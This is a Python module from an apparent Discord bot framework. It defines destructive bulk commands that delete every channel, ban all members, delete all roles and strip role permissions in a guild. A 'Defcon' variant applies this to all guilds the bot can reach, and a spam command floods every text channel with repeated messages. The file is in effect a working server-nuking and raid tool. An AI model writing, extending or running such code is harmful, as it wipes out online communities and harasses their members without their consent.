"""
Wrapped Commands are those generics commands that encapsulate
some sort of commands, giving a faster way to do something
"""
from collections.abc import Iterable

from drce.commands.channel_commands import *
from drce.commands.member_manage_type_commands import *
from drce.commands.roles_commands import *
from drce.commands.commands_archetypes import all_


class DistroyCommands(Iterable):

    def __init__(self, client):
        self.commands = []
        self.client = client

    def __add__(self, guild):
        self.commands.extend([
            DeleteChannelCommand(self.client, [str(guild.id)], [all_]),
            BanCommand(self.client, [str(guild.id)], [all_]),
            DeleteRoleCommand(self.client, [str(guild.id)], [all_]),
            # DeleteAllCategories(guild.id),
            SilentGuild(self.client, [str(guild.id)])
        ])

    def __iter__(self):
        return iter(self.commands)


class BigBadRedButton(Command, DistroyCommands):

    def __init__(self, client, guild):
        Command.__init__(self, client, guild)
        DistroyCommands.__init__(self, client)
        for guild in self.guild:
            self.__add__(guild)

    async def run(self):
        self.log_info(f"ACTIVATING THE BIG BAD RED BUTTON IN GUILD {self.guild}")
        for command in self:
            await command.run()


class Defcon(BigBadRedButton):

    def __init__(self, client):
        BigBadRedButton.__init__(self, client, [all_])

    async def run(self):
        self.log_info(f"DEFCON ACTIVATED... ALL GUILDS WILL BE AFFECTED!")
        await super().run()


class SilentGuild(EditRoleCommand):
    def __init__(self, client, guild):
        EditRoleCommand.__init__(self, client, guild, [all_], 0)

    async def run(self):
        self.log_info(f"silent guild activated, resetting all roles to 0")
        await super().run()


class Spam(Command):

    def __init__(self, client, guild, message, max_mess=10):
        Command.__init__(self, client, guild)
        self.channels = [text_channel for g in self.guild for text_channel in g.text_channels]

        from random import shuffle
        shuffle(self.channels)

        self.max_messages = max_mess
        self.message = message

    async def run(self):
        for _ in range(self.max_messages):
            for channel in self.channels:
                try:
                    await channel.send(self.message)
                    self.log_info(f"sent message {self.message} in {channel} in guild {channel.guild}")
                except Exception as e:
                    self.log_error(f"cannot sent message {self.message} in {channel} in guild {channel.guild}: ",
                                   error=e)
